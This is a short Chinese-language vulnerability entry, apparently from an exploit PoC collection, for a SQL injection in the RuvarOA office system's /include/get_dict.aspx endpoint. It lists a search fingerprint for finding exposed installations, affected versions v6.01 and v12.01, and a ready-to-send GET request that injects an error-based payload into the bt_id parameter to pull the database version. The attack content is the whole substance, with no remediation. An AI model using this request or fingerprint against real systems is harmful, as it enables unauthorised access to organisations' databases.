# RuvarOAget_dict存在SQL注入漏洞

- **系统**：RuvarOAget　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1 HTTP/1.1`

**请求体 / payload**
```

```

**其他**
- RuvarOA get\_dict存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01